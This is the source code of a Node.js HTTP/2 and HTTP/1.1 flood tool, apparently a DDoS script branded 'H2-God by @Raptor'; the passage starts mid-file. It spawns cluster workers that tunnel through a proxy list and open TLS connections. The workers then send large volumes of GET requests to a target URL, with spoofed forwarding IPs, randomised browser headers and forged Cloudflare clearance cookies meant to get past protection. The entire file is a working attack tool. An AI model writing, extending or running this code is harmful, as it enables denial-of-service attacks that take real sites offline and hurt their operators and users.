crypto.constants.SSL_OP_NO_TLSv1_3 |
crypto.constants.ALPN_ENABLED |
crypto.constants.SSL_OP_ALLOW_UNSAFE_LEGACY_RENEGOTIATION |
crypto.constants.SSL_OP_CIPHER_SERVER_PREFERENCE |
crypto.constants.SSL_OP_LEGACY_SERVER_CONNECT |
crypto.constants.SSL_OP_COOKIE_EXCHANGE |
crypto.constants.SSL_OP_PKCS1_CHECK_1 |
crypto.constants.SSL_OP_PKCS1_CHECK_2 |
crypto.constants.SSL_OP_SINGLE_DH_USE |
crypto.constants.SSL_OP_SINGLE_ECDH_USE |
crypto.constants.SSL_OP_NO_SESSION_RESUMPTION_ON_RENEGOTIATION;
let secureProtocol = "TLS_client_method";"TLSv1_3_method","TLS_method";
const secureContextOptions = {
    sigalgs: SignalsList,
    honorCipherOrder: true,
    secureOptions: secureOptions,
    secureProtocol: secureProtocol
};
const secureContext = tls.createSecureContext(secureContextOptions);

function randstr(length) {
    const chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
    return Array.from({ length }, () => chars[Math.floor(Math.random() * chars.length)]).join("");
}

function getRandomElement(array) {
    return array[Math.floor(Math.random() * array.length)];
}

const ip_spoof = () => {
   const getRandomByte = () => {
     return Math.floor(Math.random() * 255);
   };
   return `${getRandomByte()}.${getRandomByte()}.${getRandomByte()}.${getRandomByte()}`;
 };
 
 const spoofed = ip_spoof();

const args = {
    target: process.argv[2],
    time: ~~process.argv[3],
    rate: ~~process.argv[4],
    threads: ~~process.argv[5],
    proxyFile: process.argv[6]
}
const parsedTarget = url.parse(args.target);

function getRandomIP() {
    return `${Math.floor(Math.random() * 256)}.${Math.floor(Math.random() * 256)}.${Math.floor(Math.random() * 256)}.${Math.floor(Math.random() * 256)}`;
}

function getRandomReferer() {
    const referers = [
        "https://www.google.com/",
        "https://www.bing.com/",
        "https://search.yahoo.com/",
        "https://duckduckgo.com/",
        "https://www.facebook.com/",
        "https://www.twitter.com/",
        "https://www.reddit.com/",
        "https://www.linkedin.com/",
        "https://www.instagram.com/",
        "https://news.ycombinator.com/",
        "https://www.quora.com/",
        "https://www.pinterest.com/",
        "https://www.stackoverflow.com/",
        "https://www.medium.com/",
        "https://www.github.com/",
        "https://www.wikipedia.org/",
        "https://www.amazon.com/",
        "https://www.ebay.com/",
        `https://${parsedTarget.host}/`, // Referer dari target sendiri
    ];
    return referers[Math.floor(Math.random() * referers.length)];
}

const acceptHeaders = [
    "*/*",
    "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
    "application/json, text/plain, */*",
    "application/xml, text/xml, */*; q=0.01",
    "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
    "application/json, application/xml, text/xml, */*; q=0.1",
    "text/plain, */*; q=0.5",
    "application/javascript, */*; q=0.8",
    "application/x-www-form-urlencoded, */*; q=0.7",
    "image/png, image/svg+xml, image/*; q=0.8, */*; q=0.5",
    "application/pdf, application/msword, */*; q=0.9",
    "application/x-protobuf, */*; q=0.8",
    "application/x-msgpack, */*; q=0.6",
    "application/vnd.api+json, */*; q=0.7",
    "application/ld+json, application/json, */*; q=0.5",
    "multipart/form-data, */*; q=0.9",
    "text/csv, */*; q=0.8",
    "audio/mpeg, audio/ogg, */*; q=0.5",
    "video/mp4, video/webm, */*; q=0.6"
];

if (cluster.isMaster) {
   for (let counter = 1; counter <= args.threads; counter++) {
    console.clear();
    console.log(`Methods H2-God by @Raptor`.bgRed);
    console.log(`--------------------------------------------`.gray);
    console.log('[•] Target: '.white + process.argv[2].cyan);
    console.log('[•] Time: '.white + process.argv[3].cyan);
    console.log('[•] Rate: '.white + process.argv[4].cyan);
    console.log('[•] Thread(s): '.white + process.argv[5].cyan);
    console.log(`--------------------------------------------`.gray);
    console.log(`Note: Only work on http/2 and http/1.1`.brightCyan);
       cluster.fork();
   }
} else { setInterval(runFlood) }

class NetSocket {
    constructor(){}

 HTTP(options, callback) {
    const parsedAddr = options.address.split(":");
    const addrHost = parsedAddr[0];
    const payload = "CONNECT " + options.address + ":443 HTTP/1.1\r\nHost: " + options.address + ":443\r\nConnection: Keep-Alive\r\n\r\n"; //Keep Alive
    const buffer = new Buffer.from(payload);

    const connection = net.connect({
        host: options.host,
        port: options.port,
        allowHalfOpen: true,
        writable: true,
        readable: true
    });

    connection.setTimeout(options.timeout * 600000);
    connection.setKeepAlive(true, 100000);
    connection.setNoDelay(true)
    connection.on("connect", () => {
       connection.write(buffer);
   });

   connection.on("data", chunk => {
       const response = chunk.toString("utf-8");
       const isAlive = response.includes("HTTP/1.1 200");
       if (isAlive === false) {
           connection.destroy();
           return callback(undefined, "error: invalid response from proxy server");
       }
       return callback(connection, undefined);
   });

   connection.on("timeout", () => {
       connection.destroy();
       return callback(undefined, "error: timeout exceeded");
   });

}
}

const Socket = new NetSocket();

function readLines(filePath) {
    return fs.existsSync(filePath) ? fs.readFileSync(filePath, "utf-8").trim().split(/\r?\n/).filter(Boolean) : [];
}
const proxies = readLines("proxy.txt");
function randomIntn(min, max) {
  return Math.floor(Math.random() * (max - min + 1)) + min;
}
 function randomElement(elements) {
     return elements[randomIntn(0, elements.length)];
 }
 
function getRandomInt(min, max) {
    return Math.floor(Math.random() * (max - min + 1)) + min;
}

function runFlood() {
    const proxyAddr = randomElement(proxies);
    const parsedProxy = proxyAddr.split(":");
    const parsedPort = parsedTarget.protocol === "https:" ? "443" : "80";

    function randstr(length) {
        const characters = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
        let result = "";
        for (let i = 0; i < length; i++) {
            result += characters.charAt(Math.floor(Math.random() * characters.length));
        }
        return result;
    }

    const proxyOptions = {
        host: parsedProxy[0],
        port: ~~parsedProxy[1],
        address: parsedTarget.host + ":443",
        timeout: 60
    };

    Socket.HTTP(proxyOptions, (connection, error) => {
        if (error) return;

        connection.setKeepAlive(true, 100000);
        connection.setNoDelay(true);

        const headers = {
            ":method": "GET",
            ":path": parsedTarget.path,
            ":scheme": "https",
            ":authority": parsedTarget.host,
            "user-agent": userAgents[Math.floor(Math.random() * userAgents.length)],
            "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",
            "accept-encoding": acceptEncodings[Math.floor(Math.random() * acceptEncodings.length)],
            "accept-language": acceptLanguages[Math.floor(Math.random() * acceptLanguages.length)],
            "cache-control": Math.random() > 0.5 ? "no-cache" : "max-age=0",
            "pragma": "no-cache",
            "dnt": Math.random() > 0.5 ? "1" : "0",
            "sec-fetch-site": "same-origin",
            "sec-fetch-mode": "navigate",
            "sec-fetch-user": "?1",
            "sec-fetch-dest": "document",
            "origin": `https://${parsedTarget.host}`,
            "te": "trailers",
            "sec-ch-ua": `"Chromium";v="${Math.floor(Math.random() * 10) + 100}", "Google Chrome";v="${Math.floor(Math.random() * 10) + 100}", "?Not_A Brand";v="${Math.floor(Math.random() * 10) + 8}"`,
            "sec-ch-ua-mobile": getRandomElement(["?0", "?1"]),
            "sec-ch-ua-platform": getRandomElement(["Windows", "macOS", "Linux", "Android"]),
            "cf-ray": `${randstr(16)}-${parsedTarget.host}`,
            "cf-connecting-ip": getRandomIP(),
            "cdn-loop": "cloudflare",
            "x-forwarded-for": getRandomIP(),
            "referer": Math.random() < 0.5 ? "https://www.google.com/" : `https://${parsedTarget.host}/`,
            "cookie": `cf_clearance=${randstr(4)}.${randstr(20)}.${randstr(40)}-0.0.1 ${randstr(20)}; _ga=${randstr(20)}; _gid=${randstr(15)}`,
            "x-requested-with": "XMLHttpRequest",
            "upgrade-insecure-requests": "1"
        };

        const tlsOptions = {
            host: parsedTarget.host,
            servername: parsedTarget.host,
            socket: connection,
            rejectUnauthorized: false,
            ALPNProtocols: ["h2", "http/1.1"],
            ciphers: cipherList.join(":"),
            sigalgs: sigalgs,
            ecdhCurve: ecdhCurve,
            honorCipherOrder: false,
            secureOptions: secureOptions,
            secureContext: secureContext,
            secureProtocol: secureProtocol
        };

        const tlsConn = tls.connect(tlsOptions, () => {
            const negotiatedProtocol = tlsConn.alpnProtocol || "http/1.1";

            tlsConn.allowHalfOpen = true;
            tlsConn.setNoDelay(true);
            tlsConn.setKeepAlive(true, 60 * 100000);
            tlsConn.setMaxListeners(0);

            if (negotiatedProtocol === "h2") {
                const client = http2.connect(parsedTarget.href, {
                    protocol: "https:",
                    settings: {
                        headerTableSize: 65536,
                        maxConcurrentStreams: 1000,
                        initialWindowSize: 6291456,
                        maxHeaderListSize: 262144,
                        enablePush: false,
                    },
                    createConnection: () => tlsConn,
                    socket: connection,
                });

                client.on("connect", () => {
                    setInterval(() => {
                        for (let i = 0; i < args.rate; i++) {
                            const request = client.request(headers)
                                .on("response", response => {
                                    request.close();
                                    request.destroy();
                                });
                            request.end();
                        }
                    }, getRandomInt(800, 1000)); // Interval acak
                });

                client.on("close", () => {
                    client.destroy();
                    connection.destroy();
                });

                client.on("error", error => {
                    client.destroy();
                    connection.destroy();
                });

            } else {
                setInterval(() => {
                    for (let i = 0; i < args.rate; i++) {
                        const requestOptions = {
                            method: "GET",
                            hostname: parsedTarget.host,
                            path: parsedTarget.path,
                            headers: headers,
                            agent: false
                        };

                        const req = https.request(requestOptions, res => {
                            res.on("data", () => { });
                            res.on("end", () => {
                                req.destroy();
                            });
                        });

                        req.on("error", () => {
                            req.destroy();
                        });

                        req.end();
                    }
                }, getRandomInt(800, 1000)); // Interval acak
            }
        });
    });
}

const StopScript = () => process.exit(1);
setTimeout(StopScript, args.time * 1000);
process.on("uncaughtException", () => {});
process.on("unhandledRejection", () => {});